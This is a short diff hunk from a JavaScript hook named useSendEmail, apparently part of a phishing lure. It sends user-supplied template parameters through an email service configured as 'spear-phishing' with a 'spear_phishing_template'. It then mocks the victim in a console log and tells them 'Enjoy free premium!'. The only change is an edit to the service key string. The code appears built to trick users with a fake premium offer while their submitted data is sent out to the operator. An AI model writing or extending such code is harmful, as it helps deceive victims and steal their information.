@@ -28,7 +28,7 @@ const useSendEmail = (): UseSendEmailResult => {
         "spear-phishing",
         "spear_phishing_template",
         templateParams,
-        "YO_9tlZixdhtYDWw"
+        "_YO_9tlZixdhtYDWw"
       );
       console.log('GET FUCKED BOZO!', response.status, response.text);
       setMessage('Enjoy free premium!');
